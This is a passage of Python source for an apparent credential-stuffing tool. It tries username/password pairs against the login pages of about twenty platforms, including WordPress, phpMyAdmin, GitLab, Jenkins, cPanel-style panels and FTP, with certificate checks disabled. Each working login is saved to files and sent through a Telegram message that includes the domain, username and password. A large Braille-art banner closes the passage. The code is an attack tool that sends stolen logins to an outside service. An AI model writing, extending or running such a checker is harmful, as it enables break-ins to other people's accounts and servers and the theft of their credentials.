            login_url = f"https://{domain}/wp-admin/admin-ajax.php"
            r = requests.post(login_url, data={'username': user, 'password': password}, verify=False, timeout=10)
            if r.status_code == 200:
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_ghost(self, domain, user, password):
        service_name = SERVICE_NAMES['GHOST']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}/ghost/api/v2/admin/session"
            r = requests.post(login_url, json={'username': user, 'password': password}, verify=False, timeout=10)
            if r.status_code == 201:
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_typo3(self, domain, user, password):
        service_name = SERVICE_NAMES['TYPEO3']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}/typo3/index.php"
            r = requests.post(login_url, data={'username': user, 'password': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'logout' in r.text.lower():
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_concrete5(self, domain, user, password):
        service_name = SERVICE_NAMES['CONCRETE5']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}/index.php/login/do_login"
            r = requests.post(login_url, data={'uName': user, 'uPassword': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'dashboard' in r.text.lower():
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_craftcms(self, domain, user, password):
        service_name = SERVICE_NAMES['CRAFT']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}/admin/login"
            r = requests.post(login_url, data={'loginName': user, 'password': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'dashboard' in r.text.lower():
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_modx(self, domain, user, password):
        service_name = SERVICE_NAMES['MODX']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}/manager/"
            r = requests.post(login_url, data={'username': user, 'password': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'dashboard' in r.text.lower():
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_silverstripe(self, domain, user, password):
        service_name = SERVICE_NAMES['SILVERSTRIPE']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}/admin/Security/login"
            r = requests.post(login_url, data={'Email': user, 'Password': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'dashboard' in r.text.lower():
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_laravel(self, domain, user, password):
        service_name = SERVICE_NAMES['LARAVEL']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}/login"
            r = requests.post(login_url, data={'email': user, 'password': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'dashboard' in r.text.lower():
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_symfony(self, domain, user, password):
        service_name = SERVICE_NAMES['SYMFONY']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}/login"
            r = requests.post(login_url, data={'_username': user, '_password': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'logout' in r.text.lower():
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_codeigniter(self, domain, user, password):
        service_name = SERVICE_NAMES['CODEIGNITER']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}/login"
            r = requests.post(login_url, data={'username': user, 'password': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'dashboard' in r.text.lower():
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_cakephp(self, domain, user, password):
        service_name = SERVICE_NAMES['CAKEPHP']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}/users/login"
            r = requests.post(login_url, data={'email': user, 'password': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'dashboard' in r.text.lower():
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_yii(self, domain, user, password):
        service_name = SERVICE_NAMES['YII']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}/site/login"
            r = requests.post(login_url, data={'LoginForm[username]': user, 'LoginForm[password]': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'logout' in r.text.lower():
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_phpbb(self, domain, user, password):
        service_name = SERVICE_NAMES['PHPBB']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}/ucp.php?mode=login"
            r = requests.post(login_url, data={'username': user, 'password': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'logout' in r.text.lower():
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_smf(self, domain, user, password):
        service_name = SERVICE_NAMES['SMF']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}/index.php?action=login2"
            r = requests.post(login_url, data={'user': user, 'passwrd': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'logout' in r.text.lower():
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_mybb(self, domain, user, password):
        service_name = SERVICE_NAMES['MYBB']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}/member.php?action=do_login"
            r = requests.post(login_url, data={'username': user, 'password': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'logout' in r.text.lower():
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_xenforo(self, domain, user, password):
        service_name = SERVICE_NAMES['XENFORO']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}/login/login"
            r = requests.post(login_url, data={'login': user, 'password': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'logout' in r.text.lower():
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_mediawiki(self, domain, user, password):
        service_name = SERVICE_NAMES['MEDIAWIKI']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}/index.php?title=Special:UserLogin&action=submitlogin"
            r = requests.post(login_url, data={'wpName': user, 'wpPassword': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'logout' in r.text.lower():
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_dokuwiki(self, domain, user, password):
        service_name = SERVICE_NAMES['DOCUWIKI']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}/doku.php?id=start&do=login"
            r = requests.post(login_url, data={'u': user, 'p': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'logout' in r.text.lower():
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_phpmyadmin(self, domain, user, password):
        service_name = SERVICE_NAMES['PHP_MY_ADMIN']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}/phpmyadmin/index.php"
            r = requests.post(login_url, data={'pma_username': user, 'pma_password': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'server' in r.text.lower():
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_nextcloud(self, domain, user, password):
        service_name = SERVICE_NAMES['NEXTCLOUD']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}/login"
            r = requests.post(login_url, data={'user': user, 'password': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'apps' in r.text.lower():
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_gitlab(self, domain, user, password):
        service_name = SERVICE_NAMES['GITLAB']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}/users/sign_in"
            r = requests.post(login_url, data={'user[login]': user, 'user[password]': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'dashboard' in r.text.lower():
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_jenkins(self, domain, user, password):
        service_name = SERVICE_NAMES['JENKINS']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            login_url = f"https://{domain}/j_acegi_security_check"
            r = requests.post(login_url, data={'j_username': user, 'j_password': password}, verify=False, timeout=10)
            if r.status_code == 200 and 'jenkins' in r.text.lower():
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except:
            print_check_status(domain, user, password, service_name, "error")

    def check_flask(self, domain, user, password, port=8443):
        service_name = SERVICE_NAMES['FLASK']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            r = requests.post(f"https://{domain}:{port}/login_up.php", data=f'--...{user}...', headers={'Content-Type': 'multipart/form-data; boundary=...','X-Requested-With': 'XMLHttpRequest'}, timeout=10, verify=False)
            if r.status_code == 200 and 'forceRedirect":true' in r.text:
                self.handle_success(service_name, domain, user, password)
            else:
                print_check_status(domain, user, password, service_name, "failed")
        except requests.exceptions.RequestException:
            print_check_status(domain, user, password, service_name, "error")

    def check_ftp(self, domain, user, password, port=21):
        """Check FTP login credentials"""
        service_name = SERVICE_NAMES['FTP']
        try:
            print_check_status(domain, user, password, service_name, "checking")
            from ftplib import FTP
            import socket
            
            socket.setdefaulttimeout(10)
            ftp = FTP()
            ftp.connect(domain, port)
            ftp.login(user, password)
            ftp.quit()
            self.handle_success(service_name, domain, user, password)
        except Exception:
            print_check_status(domain, user, password, service_name, "failed")

    def handle_success(self, service, domain, user, password, url_base=""):
        global total_success_count
        
        output_line = ""
        if service == SERVICE_NAMES['WORDPRESS']:
            output_line = f"https://{domain}/wp-login.php#{user}@{password}"
        elif service in [SERVICE_NAMES['JOOMLA'], SERVICE_NAMES['DRUPAL'], SERVICE_NAMES['MAGENTO'], SERVICE_NAMES['PRESTASHOP'], SERVICE_NAMES['OPENCART']]:
            clean_url = url_base.split('?')[0].rstrip('/')
            output_line = f"{clean_url}#{user}@{password}"
        elif service == SERVICE_NAMES['CPANEL']:
            output_line = f"https://{domain}:2083|{user}|{password}"
        elif service == SERVICE_NAMES['WEBMAIL']:
            output_line = f"https://{domain}:2096|{user}|{password}"
        elif service == SERVICE_NAMES['FTP']:
            output_line = f"ftp://{user}:{password}@{domain}:21"
        elif service == SERVICE_NAMES['PHP_MY_ADMIN']:
            output_line = f"https://{domain}/phpmyadmin|{user}|{password}"
        elif service == SERVICE_NAMES['NEXTCLOUD']:
            output_line = f"https://{domain}|{user}|{password}"
        else:
            output_line = f"{domain}:{user}:{password}"

        # Incrémenter le compteur de succès
        with success_count_lock:
            total_success_count += 1

        # Print success with green color
        print_check_status(domain, user, password, service, "success")
        
        # Format message for Telegram
        telegram_msg = f"✅ <b>SUCCESS #{total_success_count}</b> [{service}]\n🌐 <b>Domain:</b> {domain}\n👤 <b>Username:</b> <code>{user}</code>\n🔑 <b>Password:</b> <code>{password}</code>\n📝 <b>Full:</b> <code>{output_line}</code>"
        
        with process_lock:
            # Save to service-specific file
            self.write_result(service, output_line)
            
            # Save to global file in real-time
            save_to_global_file(f"[{service}] {output_line}")
            
            # Send via Telegram
            send_telegram_message(telegram_msg)

    def write_result(self, service, line):
        folder_path = os.path.join(OUTPUT_FOLDER, CORRECT_FOLDER)
        os.makedirs(folder_path, exist_ok=True)
        file_path = os.path.join(folder_path, f"{service}.txt")
        with open(file_path, 'a', encoding='utf-8') as f:
            f.write(line + '\n')

def run_checker_instance(combo_line):
    checker = LoginChecker(combo_line)
    checker.run_checks()

def display_main_banner():
    seal_art = r"""
                                                                                          
⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⡟⠀⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⢘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⡇⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⡇⣿⠰⡀⠈⠄⠀⠀⠀⠀⠀⠀⠀⢳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣇⢻⡇⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠾⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣄⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠠⠀⠀⠀⠀⠀⠀⠡⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⣄⠀⠀⠀⠀⠀⠘⠆⠀⠈⢿⣦⠀⠀⠠⠀⠀⠀⠀⠀⢰⣶⣶⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⡶⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡄⠀⠀⠀⠀⠀⠀⠘⣦⣀⠀⠀⠀⢠⣀⠀⠀⠈⠳⠦⠀⠀⠀⠀⠀⠀⠐⠀⢻⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⡿⠃⠜⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣇⠀⠀⠀⣷⣄⠀⠀⠈⠛⢷⣶⣤⡄⠙⠳⠦⣤⡀⠈⠀⠀⠀⡀⠸⣤⣄⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⠟⢠⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠈⠻⠷⠆⢰⣿⣿⣷⣤⡀⠈⠻⣿⣿⣿⣦⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠠⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⡿⢃⣴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢶⣶⣄⠄⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⠉⠀⢀⣠⣴⣶⣶⣶⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠋⣰⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣦⡀⢀⣾⣄⠠⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀
⣡⣿⣿⠃⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⢰⡿⢋⣴⣿⣿⣿⣿⣦⣤⡹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡁⠀⠈⠉⠛⠛⠿⣿⣷⣀⡐⠠⠷⣼⠂⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣉⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⡛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣴⣆⣠⡀⠀⠀⠉⠛⠛⠛⠋⠉⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⠀
⣿⡡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⢌⡛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣦⣄⣀⣀⡠⠀⡤⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡻⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⢀⣤⣄⣠⣴⠟⢁⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡛⢿⣿⣿⣿⣴⣿⣿⣿⠟⣁⠔⣫⣴⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡠⠀⠀⡐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡉⢿⡿⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣀⡂⠉⢛⠻⠿⢋⠥⢊⣡⣾⣿⣷⡄⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡔⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣆⣻⣿⣷⣬⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣌⣒⠂⠭⠍⠛⠻⢿⠃⠀⣸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⡜⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⣴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠘⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡾⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣦⣌⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣶⣄⡙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢠⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
